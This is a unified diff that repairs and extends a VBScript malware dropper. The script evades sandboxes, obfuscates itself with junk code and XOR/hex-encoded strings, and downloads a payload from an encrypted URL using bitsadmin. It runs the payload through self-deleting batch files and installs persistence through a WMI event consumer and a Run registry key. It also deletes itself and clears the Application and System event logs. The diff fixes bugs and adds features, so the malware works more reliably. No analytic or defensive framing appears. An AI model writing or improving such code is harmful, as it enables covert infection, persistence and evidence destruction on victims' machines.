@@ -6,7 +6,7 @@
 Function XorDecrypt(ciphertext, key)
     Dim output, i, keyChar
     For i = 1 To Len(ciphertext)
-        keyChar = Asc(Mid(key, (i Mod Len(key)) + 1, 1))
+        keyChar = Asc(Mid(key, ((i-1) Mod Len(key)) + 1, 1))
         output = output & Chr(Asc(Mid(ciphertext, i, 1)) Xor keyChar)
     Next
     XorDecrypt = output
@@ -15,7 +15,9 @@ End Function
 '// --- ENVIRONMENT VALIDATION --- //
 Function IsLegitimateSystem()
     Dim wmi, cpu, mem, gpu, hour
+    On Error Resume Next
     Set wmi = GetObject("winmgmts:\\.\root\cimv2")
+    If Err.Number <> 0 Then Exit Function
     
     ' Hardware validation
     Set cpu = wmi.ExecQuery("SELECT * FROM Win32_Processor WHERE LoadPercentage > 10")
@@ -26,8 +28,11 @@ Function IsLegitimateSystem()
     hour = Hour(Now())
     
     ' Only activate on real systems during work hours
-    IsLegitimateSystem = (cpu.Count > 0) And (mem.Count > 0) And (gpu.Count > 0) And _
+    IsLegitimateSystem = (Not cpu Is Nothing) And (cpu.Count > 0) And _
+                         (Not mem Is Nothing) And (mem.Count > 0) And _
+                         (Not gpu Is Nothing) And (gpu.Count > 0) And _
                          (hour >= 8 And hour <= 18)
+    On Error GoTo 0
 End Function
 
 '==============================================
@@ -35,7 +40,7 @@ End Function
 '==============================================
 
 Function GenerateJunkCode()
-    Dim vars, ops, code
+    Dim vars, ops, code, i
     vars = Array("sys","tmp","obj","cfg","env","var")
     ops = Array("+","-","*","/","And","Or")
     
@@ -54,6 +59,7 @@ End Function
 '==============================================
 
 Sub ExecuteWithRandomDelay(command)
+    On Error Resume Next
     Dim delayMinutes, wmi, execMethod, execParams
     
     ' Calculate random delay (113-173 minutes)
@@ -64,62 +70,99 @@ Sub ExecuteWithRandomDelay(command)
     Set execMethod = wmi.Get("Win32_Process").Methods_("Create")
     Set execParams = execMethod.InParameters.SpawnInstance_
     
-    ' Create command with ping-based delay
-    execParams.CommandLine = "%COMSPEC% /b /c ping 127.0.0.1 -n " & (delayMinutes * 60) & _
-                           " & " & command
+    ' Create command with ping-based delay (fixed calculation)
+    execParams.CommandLine = "%COMSPEC% /c ping 127.0.0.1 -n " & (delayMinutes * 60 + 1) & _
+                           " >nul & " & command
     
     ' Execute with delay
     wmi.ExecMethod "Win32_Process", "Create", execParams
     
     ' Insert junk during wait
     Execute GenerateJunkCode()
+    On Error GoTo 0
 End Sub
 
 '==============================================
 '            PAYLOAD HANDLING SYSTEM
 '==============================================
 
+Function HexToString(hexStr)
+    Dim i, result
+    For i = 1 To Len(hexStr) Step 2
+        result = result & Chr(CLng("&H" & Mid(hexStr, i, 2)))
+    Next
+    HexToString = result
+End Function
+
 Sub DownloadExecuteCMD()
     On Error Resume Next
-    Dim http, shell, encUrl, tempFile, decryptedCMD
+    Dim http, shell, encUrl, tempFile, decryptedCMD, typeLib, fso, stream
     
     ' XOR-encrypted download URL (Key: "Shadow")
     encUrl = "9C8D9E9B939E8D9C8DDF9A8CDF9E939E8DDF9A8CDF9E939E8D"
-    encUrl = XorDecrypt(encUrl, "Shadow")
+    encUrl = XorDecrypt(HexToString(encUrl), "Shadow")
     
     ' Generate random temp filename
     Set typeLib = CreateObject("Scriptlet.TypeLib")
-    tempFile = "%TEMP%\" & Left(typeLib.GUID, 8) & ".dat"
-    
-    ' Download using BitsAdmin (less monitored)
     Set shell = CreateObject("WScript.Shell")
+    tempFile = shell.ExpandEnvironmentStrings("%TEMP%\" & Left(typeLib.GUID, 8) & ".dat")
+    
+    ' Download using BitsAdmin
     shell.Run "bitsadmin /transfer UpdateJob /download /priority low " & _
-              encUrl & " " & tempFile, 0, True
+              """" & encUrl & """ """ & tempFile & """", 0, True
     
     ' Read and decrypt in memory
     Set fso = CreateObject("Scripting.FileSystemObject")
     Set stream = CreateObject("ADODB.Stream")
     stream.Type = 1 ' Binary
     stream.Open
-    stream.LoadFromFile shell.ExpandEnvironmentStrings(tempFile)
+    stream.LoadFromFile tempFile
     decryptedCMD = XorDecrypt(BytesToString(stream.Read), "CmdKey")
+    stream.Close
     
     ' Execute via temporary self-deleting batch
     ExecuteTempBatch decryptedCMD
     
+    ' Save persistent payload copy
+    SavePersistentPayload decryptedCMD
+    
     ' Cleanup encrypted file
-    fso.DeleteFile shell.ExpandEnvironmentStrings(tempFile)
+    fso.DeleteFile tempFile, True
+    On Error GoTo 0
+End Sub
+
+Function BytesToString(bytes)
+    Dim stream
+    Set stream = CreateObject("ADODB.Stream")
+    stream.Type = 1 ' Binary
+    stream.Open
+    stream.Write bytes
+    stream.Position = 0
+    stream.Type = 2 ' Text
+    stream.Charset = "iso-8859-1" ' Preserve binary integrity
+    BytesToString = stream.ReadText
+    stream.Close
+End Function
+
+Sub SavePersistentPayload(cmdContent)
+    Dim fso, shell, persistentPath
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    Set shell = CreateObject("WScript.Shell")
+    
+    persistentPath = shell.ExpandEnvironmentStrings("%TEMP%\WinUpdate.cmd")
+    Set file = fso.CreateTextFile(persistentPath, True)
+    file.Write cmdContent
+    file.Close
 End Sub
 
 Sub ExecuteTempBatch(cmdContent)
-    Dim fso, shell, tempPath, batchContent
+    Dim fso, shell, tempPath, batchContent, typeLib
     Set fso = CreateObject("Scripting.FileSystemObject")
     Set shell = CreateObject("WScript.Shell")
     
     ' Create random batch filename
     Set typeLib = CreateObject("Scriptlet.TypeLib")
-    tempPath = "%TEMP%\" & Left(typeLib.GUID, 8) & ".cmd"
-    tempPath = shell.ExpandEnvironmentStrings(tempPath)
+    tempPath = shell.ExpandEnvironmentStrings("%TEMP%\" & Left(typeLib.GUID, 8) & ".cmd")
     
     ' Add self-destruct mechanism
     batchContent = "@echo off" & vbCrLf & _
@@ -129,7 +172,7 @@ Sub ExecuteTempBatch(cmdContent)
                    "del /f /q """ & tempPath & """"
     
     ' Write and execute
-    fso.CreateTextFile(tempPath).Write batchContent
+    fso.CreateTextFile(tempPath, True).Write batchContent
     shell.Run """" & tempPath & """", 0, False
 End Sub
 
@@ -138,6 +181,7 @@ End Sub
 '==============================================
 
 Sub SetStealthPersistence()
+    On Error Resume Next
     Dim shell, wmi, filter, consumer, binding
     
     Set shell = CreateObject("WScript.Shell")
@@ -153,11 +197,14 @@ Sub SetStealthPersistence()
     Set consumer = wmi.Get("ActiveScriptEventConsumer").SpawnInstance_
     consumer.Name = "SysConsumer_" & Int(Rnd * 10000)
     consumer.ScriptingEngine = "VBScript"
-    consumer.ScriptText = "Set obj = CreateObject(""WScript.Shell""): obj.Run ""%TEMP%\WinUpdate.cmd"", 0, False"
+    consumer.ScriptText = "Set obj = CreateObject(""WScript.Shell""): obj.Run """ & _
+                           shell.ExpandEnvironmentStrings("%TEMP%\WinUpdate.cmd") & """, 0, False"
     consumer.Put_
     
-    ' Registry Persistence (Less monitored location)
-    shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\Update", "%TEMP%\WinUpdate.cmd", "REG_SZ"
+    ' Registry Persistence
+    shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WinUpdate", _
+                   shell.ExpandEnvironmentStrings("%TEMP%\WinUpdate.cmd"), "REG_SZ"
+    On Error GoTo 0
 End Sub
 
 '==============================================
@@ -165,7 +212,8 @@ End Sub
 '==============================================
 
 Sub AdvancedCleanup()
-    Dim fso, shell, wmi
+    On Error Resume Next
+    Dim fso, shell, wmi, objMethod, objParams
     
     Set fso = CreateObject("Scripting.FileSystemObject")
     Set shell = CreateObject("WScript.Shell")
@@ -177,36 +225,24 @@ Sub AdvancedCleanup()
     ' Delete with delay
     Set objMethod = wmi.Get("Win32_Process").Methods_("Create")
     Set objParams = objMethod.InParameters.SpawnInstance_
-    objParams.CommandLine = "cmd /c ping 127.0.0.1 -n 30 & del """ & WScript.ScriptFullName & """"
+    objParams.CommandLine = "cmd /c ping 127.0.0.1 -n 30 >nul & del """ & WScript.ScriptFullName & """"
     wmi.ExecMethod "Win32_Process", "Create", objParams
     
     ' Clear relevant event logs
     shell.Run "wevtutil cl Application", 0, True
     shell.Run "wevtutil cl System", 0, True
+    
+    ' Exit script immediately
+    WScript.Quit()
+    On Error GoTo 0
 End Sub
-
-'==============================================
-'            HELPER FUNCTIONS
-'==============================================
-
-Function BytesToString(bytes)
-    Dim stream
-    Set stream = CreateObject("ADODB.Stream")
-    stream.Type = 1
-    stream.Open
-    stream.Write bytes
-    stream.Position = 0
-    stream.Type = 2
-    stream.Charset = "utf-8"
-    BytesToString = stream.ReadText
-    stream.Close
-End Function
 
 '==============================================
 '            MAIN EXECUTION FLOW
 '==============================================
 
 ' Insert initial junk code
+On Error Resume Next
 Execute GenerateJunkCode()
 
 If IsLegitimateSystem() Then
